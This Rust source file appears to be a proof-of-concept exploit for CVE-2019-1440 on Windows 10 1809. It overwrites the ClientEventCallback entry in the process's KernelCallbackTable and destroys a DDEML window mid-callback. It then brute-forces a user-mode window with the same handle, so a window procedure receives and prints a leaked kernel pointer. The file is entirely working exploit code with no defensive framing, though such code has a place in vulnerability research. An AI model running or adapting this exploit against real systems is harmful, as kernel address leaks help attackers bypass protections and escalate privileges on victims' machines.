#![feature(asm)]
use winapi::{
    um::{
    libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
    winuser::{DefWindowProcA, SetWindowLongPtrA, CreateWindowExA,
            DestroyWindow, IsWindow}},
    ctypes::c_void,
    shared::minwindef::{LPDWORD, DWORD, ULONG, UINT, LRESULT, WPARAM, LPARAM},
    shared::windef::HWND,
    shared::ntdef::{NULL, HANDLE, PHANDLE, PVOID, NTSTATUS}
};
use std::{
    ffi::CString,
    mem::transmute,
    sync::RwLock,
    ptr::null_mut,
};
use lazy_static::lazy_static;

type NtUserCallOneParam = extern "stdcall" fn(param: usize, routine: u32);
type NtUserDdeInitialize = extern "stdcall" fn(phinst: PHANDLE, phwnd: *mut HWND, pmonflags: LPDWORD, afcmd: DWORD, pcii: PVOID) -> UINT;
type NtCallbackReturn = extern "stdcall" fn(result: PVOID, resultlength: ULONG, status: NTSTATUS) -> NTSTATUS;

lazy_static! {
    static ref NTUSERCALLONE : RwLock<usize> = RwLock::new(0);
    static ref NTUSERDDEINIT : RwLock<usize> = RwLock::new(0);
    static ref NTUSERCALLBACK : RwLock<usize> = RwLock::new(0);
    static ref HWNDPTR : RwLock<usize> = RwLock::new(0);
    static ref CALLBACKLOCK : RwLock<bool> = RwLock::new(true);
    static ref DDEHANDLE : RwLock<usize> = RwLock::new(0);
}

fn main() {
    unsafe { init_ntfunctions(); }

    println!(">Patching kernel callback");
    //get address of new callback handler
    let newhandler = custom_callback as *mut c_void;
    println!("\t[+]Custom callback handler address: {:?}", newhandler);
    //get address of PEB
    let pebptr = cve_2019_1440::get_peb();
    println!("\t[+]PEB address: {:?}", pebptr);
    //get address of undocumented KernelCallbackTable struct from PEB
    let callbacktable = cve_2019_1440::get_callback_table(pebptr);
    println!("\t[+]KernelCallbackTable address: {:?}", callbacktable);
    //offset of ClientEventCallback in the KernelCallbackTable
    //for Windows10 1809
    let tableoffset: usize = 0x41;
    cve_2019_1440::patch_callback_table(newhandler, callbacktable, tableoffset);

    //now create DDEML objects and trigger patched callback
    unsafe {
        //backend API for DdeInitialize
        //calling this instead of DdeInitialize allows us to access the hwnd
        //so we can replace DDEML object with a user-mode window with identical hwnd
        let ddeinitptr = NTUSERDDEINIT.read().unwrap();
        let ntuserddeinit : NtUserDdeInitialize = transmute(*ddeinitptr);

        //handle references
        let mut hwnd1 : HWND = null_mut();
        let phwnd1 = &mut hwnd1;
        let mut hwnd2 : HWND = null_mut();
        let phwnd2 = &mut hwnd2;
        //current filter flags being monitored
        let mut ddeflags: DWORD = 0;
        let pddeflags = (&ddeflags as *const u32) as *mut u32;
        //instance identifier of the DDEML instance
        let mut ddehandle1: HANDLE = NULL;
        let pddehandle1 : PHANDLE = &mut ddehandle1;
        let mut ddehandle2: HANDLE = NULL;
        let pddehandle2 : PHANDLE = &mut ddehandle2;
        //flags to pass to xxxChangeMonitorFlags
        let monitorflags1: DWORD = 0xf0000000;
        let monitorflags2: DWORD = 0xfff00000;

        //create first DDE window
        println!(">Creating first DDE window");
        let result = ntuserddeinit(pddehandle1, phwnd1, pddeflags, monitorflags1, NULL);
        if result != 0 {
            println!("\t[-]NtUserDdeIntialize failed");
            println!("{:#x}", result);
            return;
        }
        if phwnd1.is_null() {
            println!("\t[-]Failed to create hWnd");
            return;
        }
        println!("\t[+]Created hWnd: {:?}", &phwnd1);
        let mut hwnd1ptr = HWNDPTR.write().unwrap();
        *hwnd1ptr = *phwnd1 as usize;
        let mut ddehandle_callback = DDEHANDLE.write().unwrap();
        *ddehandle_callback = *pddehandle1 as usize;
        //unlock so the callback can destroy the first DDE window,
        //and then replace it with a user mode window which will
        //be referenced by xxxSendMessage, returning a kernel pointer
        let mut callbacklocked = CALLBACKLOCK.write().unwrap();
        *callbacklocked = false;
        //have to call its destructor explicitly
        //or else the callback will probably deadlock
        drop(hwnd1ptr);
        drop(callbacklocked);
        drop(ddehandle_callback);

        ddeflags = 0;
        //create second DDE window
        println!(">Creating second DDE window");
        let result2 = ntuserddeinit(pddehandle2, phwnd2, pddeflags, monitorflags2, NULL);
        if result2 != 0 {
            println!("\t[-]NtUserDdeIntialize failed");
            println!("{:#x}", result);
            return;
        }
        if phwnd2.is_null() {
            println!("\t[-]Failed to create hWnd");
            return;
        }
        println!("\t[+]Created hWnd: {:?}", &phwnd2);
    }
}

unsafe fn init_ntfunctions() {
    let u32str = CString::new("user32.dll").expect("CString::new failed");
    let w32str = CString::new("win32u").expect("CString::new failed");
    let ntdllstr = CString::new("ntdll").expect("CString::new failed");
    let procstr = CString::new("NtUserCallOneParam").expect("CString::new failed");
    let ddeinitstr = CString::new("NtUserDdeInitialize").expect("CString::new failed");
    let callbackstr = CString::new("NtCallbackReturn").expect("CString::new failed");

    //load user32 so that the callback table is populated
    //and also so we can get a handle to these undocumented exports
    LoadLibraryA(u32str.as_ptr());
    //get function pointers
    let hndwin32u = GetModuleHandleA(w32str.as_ptr());
    let hndntdll = GetModuleHandleA(ntdllstr.as_ptr());
    let mut pntusercalloneparam = NTUSERCALLONE.write().unwrap();
    *pntusercalloneparam = GetProcAddress(hndwin32u, procstr.as_ptr()) as usize;
    let mut pntcallbackreturn = NTUSERCALLBACK.write().unwrap();
    *pntcallbackreturn = GetProcAddress(hndntdll, callbackstr.as_ptr()) as usize;
    let mut pddeinit = NTUSERDDEINIT.write().unwrap();
    *pddeinit = GetProcAddress(hndwin32u, ddeinitstr.as_ptr()) as usize;
}

extern "stdcall" fn custom_callback() -> NTSTATUS {
    unsafe {
        println!(">Inside callback.");
        let callbacklocked = CALLBACKLOCK.read().unwrap();
        let ntcallbackreturnptr = NTUSERCALLBACK.read().unwrap();
        let ntcallbackreturn : NtCallbackReturn = transmute(*ntcallbackreturnptr);
        if *callbacklocked == true {
            drop(callbacklocked);
            return ntcallbackreturn(NULL, 0, 0);
        }
        let ptrhwnd1 = HWNDPTR.read().unwrap();
        let calloneptr = NTUSERCALLONE.read().unwrap();
        let ddehandleptr = DDEHANDLE.read().unwrap();
        let ntusercalloneparam : NtUserCallOneParam = transmute(*calloneptr);
        let hwnd1 = *ptrhwnd1 as HWND;
        let ddehandle = *ddehandleptr;
        let mut succeed = false;
        let mut newhwnd : HWND = null_mut();

        //destroy the first DDEML instance and attempt to create a user-mode
        //window with the same hWnd
        println!(">Destroying window");
        ntusercalloneparam(ddehandle, 0x2f);
        if IsWindow(hwnd1) == 0 {
            println!(">Brute forcing HWND");
            let button = CString::new("button").expect("CString::new failed");
            let title = CString::new("").expect("CString::new failed");
            for x in 0..0x11000 {
                let handle = CreateWindowExA(
                    0,
                    button.as_ptr(),
                    title.as_ptr(),
                    0,
                    0,
                    0,
                    0,
                    0,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    null_mut(),
                );
                if (handle as u32) == (hwnd1 as u32) {
                    succeed = true;
                    newhwnd = handle.clone();
                    break;
                }
                DestroyWindow(handle);
            }
            if succeed == true {
                println!("\t[+]Got identical hwnd");
                let pwndproc = (windowproc as *mut c_void) as isize;
                SetWindowLongPtrA(newhwnd, -4, pwndproc);
            }
            else {
                println!("\t[-]Failed to get hwnd");
            }
        }
        ntcallbackreturn(NULL, 0, 0)
    }
}

extern "stdcall" fn windowproc(hwnd: HWND, message: UINT, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    println!("\t[+]Got kernel pointer: {:#x}", lparam);
    unsafe { DefWindowProcA(hwnd, message, wparam, lparam) }
}
